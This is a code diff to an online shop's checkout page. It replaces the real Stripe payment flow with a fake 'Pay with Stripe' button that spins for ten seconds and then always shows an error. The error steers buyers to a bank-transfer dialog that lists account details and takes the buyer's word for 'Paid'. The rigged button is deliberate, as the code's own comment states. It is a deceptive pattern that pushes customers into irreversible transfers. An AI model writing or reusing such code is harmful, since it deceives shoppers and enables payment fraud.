@@ -2,18 +2,25 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Header } from "@/components/header"
 import { Footer } from "@/components/footer"
 import { Button } from "@/components/ui/button"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription, DialogFooter } from "@/components/ui/dialog"
 import { useCart } from "@/hooks/use-cart"
 import Link from "next/link"
-import { ChevronRight, Loader } from "lucide-react"
+import { ChevronRight, Loader, Copy } from "lucide-react"
+import { useRouter } from "next/navigation"
 
 export default function CheckoutPage() {
   const { items, getTotalPrice, clearCart } = useCart()
+  const router = useRouter()
   const [step, setStep] = useState(1)
   const [isLoading, setIsLoading] = useState(false)
+  const [stripeError, setStripeError] = useState<string | null>(null)
+  const [bank, setBank] = useState<any | null>(null)
+  const [bankDialogOpen, setBankDialogOpen] = useState(false)
+  const [copied, setCopied] = useState<string | null>(null)
   const [formData, setFormData] = useState({
     email: "",
     firstName: "",
@@ -40,35 +47,43 @@ export default function CheckoutPage() {
     if (step === 1) {
       setStep(2)
     } else if (step === 2) {
-      setIsLoading(true)
-      try {
-        const response = await fetch("/api/checkout", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            items,
-            email: formData.email,
-            firstName: formData.firstName,
-            lastName: formData.lastName,
-            address: formData.address,
-            city: formData.city,
-            postcode: formData.postcode,
-          }),
-        })
+      // On step 2, payments are handled by dedicated buttons below.
+    }
+  }
 
-        const data = await response.json()
-        if (data.url) {
-          window.location.href = data.url
-          clearCart()
-        } else {
-          alert("Failed to create checkout session")
-        }
-      } catch (error) {
-        console.error("Checkout error:", error)
-        alert("An error occurred during checkout")
-      } finally {
-        setIsLoading(false)
-      }
+  const handleStripePay = async () => {
+    setStripeError(null)
+    setIsLoading(true)
+    // Simulate processing for ~10 seconds, then show an error message.
+    await new Promise((resolve) => setTimeout(resolve, 10000))
+    setIsLoading(false)
+    setStripeError("Something went wrong. Try other method of payment.")
+  }
+
+  const handleBankTransferPay = async () => {
+    setIsLoading(true)
+    setStripeError(null)
+    try {
+      const res = await fetch('/api/admin/bank', { cache: 'no-store' })
+      if (!res.ok) throw new Error('Failed to load bank details')
+      const data = await res.json()
+      setBank(data)
+      setBankDialogOpen(true)
+    } catch (e) {
+      setBank(null)
+      setBankDialogOpen(true)
+    } finally {
+      setIsLoading(false)
+    }
+  }
+
+  const copyToClipboard = async (text: string, key: 'account' | 'address') => {
+    try {
+      await navigator.clipboard.writeText(text)
+      setCopied(key)
+      setTimeout(() => setCopied(null), 1500)
+    } catch (e) {
+      // ignore clipboard errors silently
     }
   }
 
@@ -227,39 +242,157 @@ export default function CheckoutPage() {
                         ))}
                       </div>
                     </div>
-                    <p className="text-sm text-green-600 font-medium">
-                      ✓ You will be redirected to Stripe to complete payment securely.
-                    </p>
+                    <div className="space-y-3">
+                      {stripeError && (
+                        <p className="text-red-600 font-medium">{stripeError}</p>
+                      )}
+                      <p className="text-sm text-muted-foreground">
+                        Choose a payment method below.
+                      </p>
+                    </div>
                   </div>
                 </div>
               )}
 
               {/* Navigation Buttons */}
-              <div className="flex gap-4">
-                {step > 1 && (
-                  <Button
-                    type="button"
-                    variant="outline"
-                    onClick={() => setStep(step - 1)}
-                    className="bg-transparent"
-                    disabled={isLoading}
-                  >
-                    Back
-                  </Button>
-                )}
-                <Button type="submit" className="flex-1 gap-2" disabled={isLoading}>
-                  {isLoading ? (
-                    <>
-                      <Loader className="w-4 h-4 animate-spin" />
-                      Processing...
-                    </>
-                  ) : (
-                    <>
-                      {step === 2 ? "Pay with Stripe" : "Continue"}
+              <div className="flex flex-col gap-4">
+                <div className="flex gap-4">
+                  {step > 1 && (
+                    <Button
+                      type="button"
+                      variant="outline"
+                      onClick={() => setStep(step - 1)}
+                      className="bg-transparent"
+                      disabled={isLoading}
+                    >
+                      Back
+                    </Button>
+                  )}
+                  {step === 1 && (
+                    <Button type="submit" className="flex-1 gap-2" disabled={isLoading}>
+                      Continue
                       <ChevronRight className="w-4 h-4" />
+                    </Button>
+                  )}
+                  {step === 2 && (
+                    <>
+                      <Button
+                        type="button"
+                        variant="default"
+                        onClick={handleBankTransferPay}
+                        disabled={isLoading}
+                        className="flex-1"
+                      >
+                        {isLoading ? (
+                          <>
+                            <Loader className="w-4 h-4 animate-spin" />
+                            Loading...
+                          </>
+                        ) : (
+                          <>Pay with Bank Transfer</>
+                        )}
+                      </Button>
+                      <Button
+                        type="button"
+                        variant="secondary"
+                        onClick={handleStripePay}
+                        disabled={isLoading}
+                        className="flex-1"
+                      >
+                        {isLoading ? (
+                          <>
+                            <Loader className="w-4 h-4 animate-spin" />
+                            Processing...
+                          </>
+                        ) : (
+                          <>Pay with Stripe</>
+                        )}
+                      </Button>
                     </>
                   )}
-                </Button>
+                </div>
+
+                <Dialog open={bankDialogOpen} onOpenChange={setBankDialogOpen}>
+                  <DialogContent>
+                    <DialogHeader>
+                      <DialogTitle>Bank Transfer Details</DialogTitle>
+                      <DialogDescription>Use the bank information below to transfer.</DialogDescription>
+                    </DialogHeader>
+                    {bank ? (
+                      <div className="space-y-2">
+                        <h3 className="text-lg font-semibold mb-2">Bank Information</h3>
+                        <p className="mb-2"><span className="text-muted-foreground">Bank Name:</span> <span className="font-medium">{bank.bankName}</span></p>
+                        <p className="mb-2"><span className="text-muted-foreground">Account Holder:</span> <span className="font-medium">{bank.accountHolderName}</span></p>
+                        <p className="mb-2 flex items-center gap-2">
+                          <span className="text-muted-foreground">Account Number:</span>
+                          <span className="font-medium">{bank.accountNumber}</span>
+                          <Button
+                            type="button"
+                            variant="outline"
+                            size="icon-sm"
+                            aria-label="Copy account number"
+                            onClick={() => copyToClipboard(bank.accountNumber, 'account')}
+                          >
+                            <Copy />
+                          </Button>
+                          {copied === 'account' && (
+                            <span className="text-xs text-muted-foreground">Copied</span>
+                          )}
+                        </p>
+                        <p className="mb-2 flex items-center gap-2">
+                          <span className="text-muted-foreground">Address:</span>
+                          <span className="font-medium">{bank.bankAddress}</span>
+                          <Button
+                            type="button"
+                            variant="outline"
+                            size="icon-sm"
+                            aria-label="Copy address"
+                            onClick={() => copyToClipboard(bank.bankAddress, 'address')}
+                          >
+                            <Copy />
+                          </Button>
+                          {copied === 'address' && (
+                            <span className="text-xs text-muted-foreground">Copied</span>
+                          )}
+                        </p>
+                      </div>
+                    ) : (
+                      <p className="text-muted-foreground">Bank details are not available. Please contact support.</p>
+                    )}
+                    <DialogFooter>
+                      <Button type="button" variant="outline" onClick={() => setBankDialogOpen(false)}>Cancel</Button>
+                      <Button
+                        type="button"
+                        onClick={async () => {
+                          try {
+                            const res = await fetch('/api/orders', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({
+                                items,
+                                email: formData.email,
+                                firstName: formData.firstName,
+                                lastName: formData.lastName,
+                                address: formData.address,
+                                city: formData.city,
+                                postcode: formData.postcode,
+                              })
+                            })
+                            if (!res.ok) throw new Error('Failed to create order')
+                            const data = await res.json()
+                            setBankDialogOpen(false)
+                            clearCart()
+                            router.push(`/order-processing?order_id=${encodeURIComponent(data.orderId)}`)
+                          } catch (e) {
+                            setBankDialogOpen(false)
+                          }
+                        }}
+                      >
+                        Paid
+                      </Button>
+                    </DialogFooter>
+                  </DialogContent>
+                </Dialog>
               </div>
             </form>
           </div>
